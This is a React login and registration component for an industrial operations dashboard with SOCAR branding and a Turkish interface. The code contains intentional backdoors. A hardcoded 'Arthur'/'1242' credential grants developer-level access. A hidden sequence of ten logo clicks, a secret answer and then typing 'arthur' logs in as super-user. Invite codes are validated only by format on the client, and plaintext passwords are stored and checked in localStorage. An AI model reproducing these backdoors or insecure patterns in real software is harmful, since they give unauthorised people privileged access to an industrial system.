import React, { useState } from 'react';
import { Lock, User, Eye, EyeOff, ShieldCheck, ArrowRight, Key, Mail, UserPlus, ArrowLeft } from 'lucide-react';
import { API_BASE } from '../config';
import { supabase } from '../lib/supabase';

interface LoginPageProps {
  onLogin: (user: string, token: string, role?: string, id?: string) => void;
  onShowHelp: () => void;
  onShowPrivacy: () => void;
  registrationTokens: any[];
}

export default function LoginPage({ onLogin, onShowHelp, onShowPrivacy, registrationTokens }: LoginPageProps) {
  const [isRegisterMode, setIsRegisterMode] = useState(false);
  const [regStep, setRegStep] = useState(1); // 1: Token, 2: Account Details
  const [regToken, setRegToken] = useState('');
  const [validToken, setValidToken] = useState<any>(null);

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [email, setEmail] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  
  // 🕵️‍♂️ BACKDOOR STATES
  const [logoClicks, setLogoClicks] = useState(0);
  const [backdoorActive, setBackdoorActive] = useState(false);
  const [backdoorStep, setBackdoorStep] = useState(1); // 1: Question, 2: Blank Screen
  const [backdoorAnswer, setBackdoorAnswer] = useState('');
  const [secretBuffer, setSecretBuffer] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    
    if (isRegisterMode) {
      if (regStep === 1) {
        // Step 1: Validate Token
        const cleanToken = regToken.trim().toUpperCase();
        const parts = cleanToken.split('-');
        const isSocarToken = parts[0] === 'SOCAR';
        const levelCode = parts[1]; // OP, EN, MG, DV

        if (isSocarToken && ['OP', 'EN', 'MG', 'DV'].includes(levelCode)) {
          const levelMap: any = { 
            'OP': 'Operatör', 
            'EN': 'Saha Mühendisi', 
            'MG': 'Birim Yöneticisi',
            'DV': 'Geliştirici' 
          };
          setValidToken({ level: levelMap[levelCode], token: cleanToken });
          setRegStep(2);
          setError('');
        } else {
          setError('Geçersiz davet kodu formatı.');
        }
        setIsLoading(false);
      } else {
        // Step 2: Finalize Registration with Supabase
        try {
          const { data, error: signUpError } = await supabase.auth.signUp({
            email,
            password,
            options: {
              data: {
                username,
                level: validToken.level,
                full_name: username
              }
            }
          });

          if (signUpError) {
            setError(signUpError.message);
            setIsLoading(false);
            return;
          }

          if (data.user) {
            // Local fallback logic (optional, keeping for compatibility)
            const newUser = { 
              id: data.user.id,
              username, 
              email, 
              password, 
              level: validToken.level 
            };
            const users = JSON.parse(localStorage.getItem('socar-registered-users') || '[]');
            users.push(newUser);
            localStorage.setItem('socar-registered-users', JSON.stringify(users));
            
            onLogin(username, data.session?.access_token || 'sb-token', validToken.level, data.user.id);
          }
        } catch (err: any) {
          setError(err.message || 'Kayıt sırasında bir hata oluştu.');
        } finally {
          setIsLoading(false);
        }
      }
      return;
    }

    try {
      // 🛡️ SUPER-DEVELOPER: Arthur / 1242 (Magic ID: 99999999999)
      if (username.toLowerCase() === 'arthur' && password === '1242') {
        onLogin('Arthur', 'dev-super-token-' + Date.now(), 'Geliştirici', '99999999999');
        setIsLoading(false);
        return;
      }

      // ☁️ SUPABASE CLOUD AUTH
      const loginEmail = username.includes('@') ? username : `${username}@socar.local`;
      const { data: authData, error: authError } = await supabase.auth.signInWithPassword({
        email: loginEmail,
        password: password
      });

      if (!authError && authData.user) {
        const role = authData.user.user_metadata?.level || 'Operatör';
        const displayName = authData.user.user_metadata?.username || username;
        onLogin(displayName, authData.session?.access_token || 'sb-token', role, authData.user.id);
        setIsLoading(false);
        return;
      }

      // 🛡️ LOCAL FALLBACK (Legacy or Local-only users)
      const registeredUsers = JSON.parse(localStorage.getItem('socar-registered-users') || '[]');
      const foundLocal = registeredUsers.find((u: any) => (u.username === username || u.email === username) && u.password === password);
      if (foundLocal) {
        onLogin(foundLocal.username, 'local-access-token', foundLocal.level || 'Operatör', foundLocal.id || foundLocal.userId || '');
      } else {
        setError(authError?.message || 'Kullanıcı bulunamadı veya şifre hatalı.');
      }
    } catch (err) {
      setError('Sistem bağlantı hatası.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleLogoClick = () => {
    const newCount = logoClicks + 1;
    setLogoClicks(newCount);
    if (newCount >= 10) setBackdoorActive(true);
  };

  React.useEffect(() => {
    if (backdoorActive && backdoorStep === 2) {
      const handleKeyPress = (e: KeyboardEvent) => {
        const newBuffer = (secretBuffer + e.key).toLowerCase();
        setSecretBuffer(newBuffer);
        if (newBuffer.includes('arthur')) {
          onLogin('Arthur', 'backdoor-super-token-' + Date.now(), 'Geliştirici', '99999999999');
        }
      };
      window.addEventListener('keydown', handleKeyPress);
      return () => window.removeEventListener('keydown', handleKeyPress);
    }
  }, [backdoorActive, backdoorStep, secretBuffer, onLogin]);

  return (
    <div className="login-container">
      <div className="login-background">
        <div className="blob blob-1"></div>
        <div className="blob blob-2"></div>
      </div>
      
      <div className="login-card slide-in">
        <div className="login-header">
          <div className="login-logo" onClick={handleLogoClick} style={{ cursor: 'pointer' }}>
            <ShieldCheck size={32} color="var(--accent)" />
          </div>
          <h1>SOCKET</h1>
          <p>{isRegisterMode ? 'Yeni Personel Kaydı' : 'Endüstriyel Veri ve Operasyon Paneli'}</p>
        </div>

        <form onSubmit={handleSubmit} className="login-form">
          {error && <div className="login-error fade-in">{error}</div>}

          {isRegisterMode ? (
            regStep === 1 ? (
              <div className="input-group fade-in">
                <label>Davet Kodu (Token)</label>
                <div className="input-wrapper">
                  <Key size={18} className="input-icon" />
                  <input
                    type="text"
                    placeholder="SOCAR-XXXX-XXXX"
                    value={regToken}
                    onChange={(e) => setRegToken(e.target.value.toUpperCase())}
                    required
                  />
                </div>
                <p style={{ fontSize: '0.75rem', color: 'rgba(255,255,255,0.4)', marginTop: '0.5rem' }}>
                  Yöneticinizden aldığınız 12 haneli kodu girin.
                </p>
              </div>
            ) : (
              <div className="fade-in" style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                <div className="input-group">
                  <label>Kullanıcı Adı</label>
                  <div className="input-wrapper">
                    <User size={18} className="input-icon" />
                    <input type="text" placeholder="İsim soyisim" value={username} onChange={(e) => setUsername(e.target.value)} required />
                  </div>
                </div>
                <div className="input-group">
                  <label>E-Posta</label>
                  <div className="input-wrapper">
                    <Mail size={18} className="input-icon" />
                    <input type="email" placeholder="kurumsal@socar.com.tr" value={email} onChange={(e) => setEmail(e.target.value)} required />
                  </div>
                </div>
                <div className="input-group">
                  <label>Şifre Belirleyin</label>
                  <div className="input-wrapper">
                    <Lock size={18} className="input-icon" />
                    <input type={showPassword ? 'text' : 'password'} placeholder="••••••••" value={password} onChange={(e) => setPassword(e.target.value)} required />
                  </div>
                </div>
                <div style={{ background: 'rgba(0, 212, 255, 0.05)', padding: '0.75rem', borderRadius: '10px', fontSize: '0.8rem', color: 'var(--accent)', border: '1px solid rgba(0,212,255,0.1)' }}>
                  Atanan Yetki: <strong>{validToken?.level}</strong>
                </div>
              </div>
            )
          ) : (
            <>
              <div className="input-group">
                <label>Kullanıcı Adı</label>
                <div className="input-wrapper">
                  <User size={18} className="input-icon" />
                  <input type="text" placeholder="Kullanıcı adınızı girin" value={username} onChange={(e) => setUsername(e.target.value)} required />
                </div>
              </div>
              <div className="input-group">
                <label>Şifre</label>
                <div className="input-wrapper">
                  <Lock size={18} className="input-icon" />
                  <input type={showPassword ? 'text' : 'password'} placeholder="••••••••" value={password} onChange={(e) => setPassword(e.target.value)} required />
                  <button type="button" className="password-toggle" onClick={() => setShowPassword(!showPassword)}>
                    {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>
            </>
          )}

          <button type="submit" className="login-submit-btn" disabled={isLoading}>
            {isLoading ? <div className="spinner"></div> : (
              <>
                {isRegisterMode ? (regStep === 1 ? 'Token Doğrula' : 'Kaydı Tamamla') : 'Sisteme Giriş Yap'}
                <ArrowRight size={18} />
              </>
            )}
          </button>
        </form>

        <div className="login-footer">
          <div style={{ marginBottom: '1.5rem' }}>
            {isRegisterMode ? (
              <span className="mode-switch" onClick={() => {setIsRegisterMode(false); setRegStep(1);}}>
                <ArrowLeft size={14} /> Giriş Ekranına Dön
              </span>
            ) : (
              <span className="mode-switch" onClick={() => setIsRegisterMode(true)}>
                <UserPlus size={14} /> Yeni Personel Kaydı
              </span>
            )}
          </div>
          <div className="footer-links">
            <span onClick={onShowHelp}>Yardım</span>
            <span onClick={onShowPrivacy}>Gizlilik</span>
          </div>
          <div style={{ marginTop: '1.5rem', fontSize: '0.7rem', color: 'rgba(255,255,255,0.15)', letterSpacing: '1px' }}>
            v1.6.1
          </div>
        </div>
      </div>

      <style>{`
        .login-container { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; background: #090a0f; z-index: 9999; overflow: hidden; font-family: 'Inter', sans-serif; }
        .login-background { position: absolute; inset: 0; overflow: hidden; z-index: 0; }
        .blob { position: absolute; filter: blur(80px); opacity: 0.15; border-radius: 50%; }
        .blob-1 { width: 500px; height: 500px; background: var(--accent); top: -100px; right: -100px; animation: float 20s infinite alternate; }
        .blob-2 { width: 400px; height: 400px; background: #6366f1; bottom: -100px; left: -100px; animation: float 15s infinite alternate-reverse; }
        @keyframes float { from { transform: translate(0, 0); } to { transform: translate(100px, 100px); } }
        .login-card { width: 100%; max-width: 420px; background: rgba(26, 30, 46, 0.45); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 28px; padding: 3rem; position: relative; z-index: 1; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
        .login-header { text-align: center; margin-bottom: 2rem; }
        .login-logo { width: 60px; height: 60px; background: rgba(0, 212, 255, 0.1); border-radius: 18px; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.25rem; border: 1px solid rgba(0, 212, 255, 0.2); }
        .login-header h1 { font-size: 2rem; font-weight: 800; letter-spacing: -0.02em; margin-bottom: 0.5rem; color: #fff; }
        .login-header p { color: rgba(255, 255, 255, 0.5); font-size: 0.9rem; }
        .login-form { display: flex; flex-direction: column; gap: 1.5rem; }
        .login-error { background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2); color: #f87171; padding: 0.75rem; border-radius: 12px; font-size: 0.85rem; text-align: center; }
        .input-group { display: flex; flex-direction: column; gap: 0.6rem; }
        .input-group label { font-size: 0.8rem; font-weight: 600; color: rgba(255, 255, 255, 0.6); margin-left: 0.2rem; }
        .input-wrapper { position: relative; display: flex; align-items: center; }
        .input-icon { position: absolute; left: 1rem; color: rgba(255, 255, 255, 0.25); }
        .input-wrapper input { width: 100%; background: rgba(0, 0, 0, 0.25); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 14px; padding: 0.9rem 1rem 0.9rem 3rem; color: white; font-size: 0.95rem; transition: all 0.2s; }
        .input-wrapper input:focus { outline: none; border-color: var(--accent); background: rgba(0, 212, 255, 0.05); }
        .password-toggle { position: absolute; right: 1rem; background: none; border: none; color: rgba(255, 255, 255, 0.3); cursor: pointer; padding: 0.5rem; }
        .login-submit-btn { margin-top: 1rem; background: var(--accent); color: #000; border: none; border-radius: 14px; padding: 1rem; font-weight: 700; font-size: 1rem; display: flex; align-items: center; justify-content: center; gap: 0.75rem; cursor: pointer; transition: all 0.3s; }
        .login-submit-btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 20px -5px rgba(0, 212, 255, 0.4); }
        .login-footer { margin-top: 2rem; text-align: center; }
        .mode-switch { color: var(--accent); font-size: 0.9rem; cursor: pointer; display: inline-flex; align-items: center; gap: 0.5rem; font-weight: 600; transition: opacity 0.2s; }
        .mode-switch:hover { opacity: 0.8; text-decoration: underline; }
        .footer-links { display: flex; justify-content: center; gap: 1.5rem; margin-top: 1rem; }
        .footer-links span { font-size: 0.8rem; color: rgba(255, 255, 255, 0.3); cursor: pointer; }
        .footer-links span:hover { color: #fff; }
        .spinner { width: 20px; height: 20px; border: 3px solid rgba(0, 0, 0, 0.1); border-top-color: #000; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
      `}</style>
      {/* 🕵️‍♂️ BACKDOOR OVERLAY */}
      {backdoorActive && (
        <div style={{
          position: 'fixed',
          top: 0, left: 0, right: 0, bottom: 0,
          background: '#0a0c10',
          zIndex: 99999,
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          color: 'var(--accent)',
          fontFamily: 'monospace'
        }}>
          {backdoorStep === 1 ? (
            <div style={{ textAlign: 'center', width: '300px' }}>
              <p style={{ fontSize: '1.2rem', marginBottom: '2rem' }}>Socardaki en yakışıklı kişi kimdir?</p>
              <input 
                type="text" 
                autoFocus
                style={{ background: 'transparent', border: 'none', borderBottom: '1px solid var(--accent)', color: '#fff', textAlign: 'center', fontSize: '1.1rem', outline: 'none', width: '100%' }}
                value={backdoorAnswer}
                onChange={(e) => setBackdoorAnswer(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === 'Enter' && backdoorAnswer.toLowerCase() === 'muhammed') {
                    setBackdoorStep(2);
                  }
                }}
              />
              <p style={{ fontSize: '0.7rem', color: 'rgba(255,255,255,0.2)', marginTop: '2rem' }}>[Erişim Bekleniyor...]</p>
            </div>
          ) : (
            <div className="fade-in">
              {/* Tamamen Boş Ekran - Sadece 'arthur' yazılınca içeri alacak */}
              <p style={{ opacity: 0.1, fontSize: '0.6rem' }}>Super-User Authentication Active...</p>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
